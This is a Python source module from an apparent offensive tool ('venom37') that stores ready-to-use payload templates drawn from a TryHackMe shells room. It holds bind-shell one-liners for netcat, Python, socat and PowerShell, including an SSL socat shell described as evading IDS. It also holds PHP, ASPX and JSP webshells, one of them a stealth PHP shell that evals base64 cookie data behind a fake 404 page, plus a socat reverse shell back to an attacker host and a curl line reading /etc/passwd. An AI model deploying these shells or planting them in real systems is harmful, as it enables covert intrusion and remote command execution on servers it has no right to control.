"""venom37 bind shells and webshell templates.

Techniques from TryHackMe What the Shell room:
- Bind shells (target listens, attacker connects)
- Webshell templates (PHP, ASPX, JSP)
- Shell stabilization commands
- Socat encrypted shells
"""
from __future__ import annotations


BIND_SHELLS = {
    "nc-bind": {
        "name": "Netcat Bind Shell",
        "target_cmd": "nc -lvnp {lport} -e /bin/sh",
        "connect_cmd": "nc {rhost} {lport}",
        "description": "Netcat bind shell. Target listens, attacker connects. Requires nc with -e flag.",
        "platform": "linux",
        "requires": "netcat-traditional",
    },
    "nc-mkfifo-bind": {
        "name": "Netcat mkfifo Bind Shell",
        "target_cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {lport} >/tmp/f",
        "connect_cmd": "nc {rhost} {lport}",
        "description": "Netcat bind shell using mkfifo. Works with any netcat version.",
        "platform": "linux",
        "requires": "any netcat + mkfifo",
    },
    "python-bind": {
        "name": "Python Bind Shell",
        "target_cmd": (
            "python3 -c '"
            "import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
            "s.bind((\"0.0.0.0\",{lport}));"
            "s.listen(1);"
            "c,a=s.accept();"
            "os.dup2(c.fileno(),0);"
            "os.dup2(c.fileno(),1);"
            "os.dup2(c.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "connect_cmd": "nc {rhost} {lport}",
        "description": "Python bind shell. Target listens on port, attacker connects with nc.",
        "platform": "linux",
        "requires": "python3",
    },
    "socat-bind": {
        "name": "Socat Bind Shell",
        "target_cmd": "socat TCP-L:{lport} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        "connect_cmd": "socat - TCP:{rhost}:{lport}",
        "description": "Socat bind shell with PTY. Best quality bind shell.",
        "platform": "linux",
        "requires": "socat",
    },
    "socat-encrypted-bind": {
        "name": "Socat Encrypted Bind Shell",
        "target_cmd": "socat OPENSSL-LISTEN:{lport},cert=encrypt.pem,verify=0 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        "connect_cmd": "socat OPENSSL:{rhost}:{lport},verify=0 -",
        "description": "Socat encrypted bind shell (SSL). Evades network IDS. Generate cert: openssl req -newkey rsa:2048 -nodes -keyout encrypt.pem -x509 -out encrypt.pem",
        "platform": "linux",
        "requires": "socat + openssl",
    },
    "powershell-bind": {
        "name": "PowerShell Bind Shell",
        "target_cmd": (
            "powershell -nop -c \""
            "$l = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{lport});"
            "$l.Start();"
            "$c = $l.AcceptTcpClient();"
            "$s = $c.GetStream();"
            "[byte[]]$b = 0..65535|%{0};"
            "while(($i = $s.Read($b, 0, $b.Length)) -ne 0){"
            "$d = (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r = (iex $d 2>&1 | Out-String);"
            "$r2 = $r + 'PS ' + (pwd).Path + '> ';"
            "$sb = ([text.encoding]::ASCII).GetBytes($r2);"
            "$s.Write($sb,0,$sb.Length);$s.Flush()};"
            "$c.Close();$l.Stop()\""
        ),
        "connect_cmd": "nc {rhost} {lport}",
        "description": "PowerShell bind shell. Target listens, attacker connects.",
        "platform": "windows",
        "requires": "powershell",
    },
}


WEBSHELLS = {
    "php-simple": {
        "name": "PHP Simple Webshell",
        "code": "<?php echo shell_exec($_GET['cmd']); ?>",
        "usage": "curl 'http://TARGET/shell.php?cmd=whoami'",
        "description": "Minimal PHP webshell. One line, easy to inject.",
        "platform": "linux/windows",
    },
    "php-system": {
        "name": "PHP System Webshell",
        "code": "<?php if(isset($_REQUEST['cmd'])){echo '<pre>';system($_REQUEST['cmd']);echo '</pre>';} ?>",
        "usage": "curl 'http://TARGET/shell.php?cmd=id'",
        "description": "PHP webshell using system() with pre-formatted output.",
        "platform": "linux/windows",
    },
    "php-passthru": {
        "name": "PHP Passthru Webshell",
        "code": "<?php if(isset($_GET['cmd'])){passthru($_GET['cmd']);} ?>",
        "usage": "curl 'http://TARGET/shell.php?cmd=cat+/etc/passwd'",
        "description": "PHP webshell using passthru() for binary-safe output.",
        "platform": "linux/windows",
    },
    "php-stealth": {
        "name": "PHP Stealth Webshell",
        "code": (
            "<?php\n"
            "// Looks like a normal PHP file\n"
            "$f = 'base'.'64_'.'decode';\n"
            "$c = $_COOKIE['session'] ?? '';\n"
            "if($c){@eval($f($c));}\n"
            "echo '<html><body><h1>404 Not Found</h1></body></html>';\n"
            "?>"
        ),
        "usage": "curl -b 'session=BASE64_ENCODED_PHP_CODE' http://TARGET/shell.php",
        "description": "Stealth webshell hidden in cookie. Returns fake 404 page. Harder to detect.",
        "platform": "linux/windows",
    },
    "aspx-simple": {
        "name": "ASPX Simple Webshell",
        "code": (
            '<%@ Page Language="C#" %>\n'
            "<%@ Import Namespace=\"System.Diagnostics\" %>\n"
            "<%\n"
            "string cmd = Request[\"cmd\"];\n"
            "if (cmd != null) {\n"
            "    Process p = new Process();\n"
            "    p.StartInfo.FileName = \"cmd.exe\";\n"
            "    p.StartInfo.Arguments = \"/c \" + cmd;\n"
            "    p.StartInfo.UseShellExecute = false;\n"
            "    p.StartInfo.RedirectStandardOutput = true;\n"
            "    p.Start();\n"
            "    Response.Write(\"<pre>\" + p.StandardOutput.ReadToEnd() + \"</pre>\");\n"
            "}\n"
            "%>"
        ),
        "usage": "curl 'http://TARGET/shell.aspx?cmd=whoami'",
        "description": "ASPX webshell for IIS/.NET servers.",
        "platform": "windows",
    },
    "jsp-simple": {
        "name": "JSP Simple Webshell",
        "code": (
            "<%@ page import=\"java.util.*,java.io.*\"%>\n"
            "<%\n"
            "String cmd = request.getParameter(\"cmd\");\n"
            "if (cmd != null) {\n"
            "    Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", cmd});\n"
            "    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n"
            "    String line;\n"
            "    while ((line = br.readLine()) != null) { out.println(line); }\n"
            "}\n"
            "%>"
        ),
        "usage": "curl 'http://TARGET/shell.jsp?cmd=id'",
        "description": "JSP webshell for Tomcat/Java servers.",
        "platform": "linux/windows",
    },
}


STABILIZE = {
    "python-pty": {
        "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "description": "Spawn a proper PTY using Python. First step of stabilization.",
    },
    "export-term": {
        "cmd": "export TERM=xterm",
        "description": "Set terminal type so clear, arrows, etc. work.",
    },
    "stty-raw": {
        "cmd": "stty raw -echo; fg",
        "description": "Set terminal to raw mode (Ctrl+Z first, then run this on YOUR machine).",
    },
    "script-pty": {
        "cmd": "script /dev/null -c bash",
        "description": "Alternative PTY spawn using script command.",
    },
    "socat-pty": {
        "cmd": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT",
        "description": "Best stabilization -- use socat for a fully interactive shell from the start.",
    },
    "stty-size": {
        "cmd": "stty rows ROWS cols COLS",
        "description": "Match terminal size. Run 'stty -a' on your machine first to get values.",
    },
}
